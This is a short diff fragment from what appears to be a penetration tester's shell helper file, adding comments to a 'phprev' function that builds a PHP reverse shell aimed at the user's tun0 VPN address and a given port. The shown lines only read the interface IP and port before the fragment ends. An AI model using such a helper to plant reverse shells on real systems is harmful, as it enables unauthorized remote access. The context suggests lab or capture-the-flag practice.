@@ -197,6 +197,9 @@ sudo bloodhound &
 
 
 phprev() {
+# Easy way of creating php reverse shell for your tun0 connection and your prefered port number.  
+# Outputs to whatever directory you are currently in with Terminal.
+# Usage: phprev <port>
 ipaddy=$(sudo ifconfig tun0 | grep "inet " | tr -s " " | cut -d " " -f 3)
 port="$1"
 
